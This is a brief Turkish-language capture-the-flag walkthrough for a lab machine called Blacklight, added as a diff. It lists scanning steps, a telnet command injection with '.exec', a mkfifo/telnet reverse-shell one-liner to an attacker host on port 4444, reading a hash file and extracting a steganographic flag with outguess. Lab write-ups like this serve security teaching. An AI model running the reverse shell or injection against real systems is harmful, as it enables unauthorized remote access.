@@ -1,0 +1,10 @@
+BLACKLİGHT MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.33 bulundu.
+2 - nmap -A -p- 192.168.2.33
+3 - http://192.168.2.33/robots.txt, blacklist.dict
+4 - telnet 192.168.2.33 9072 
+5 - .exec mkfifo /tmp/abcd && telnet 192.168.2.128 4444 0</tmp/abcd | /bin/sh 1>/tmp/abcd
+6 - whoami, cd /home/blacklight, cat hash.txt
+7 - cd .secret, cp flag2-inside.jpg /var/www/html/img
+8 - wget http://192.168.2.33/img/flag2-inside.jpg
+9 - outguess -r flag2-inside.jpg -t blacklight_flag2.txt
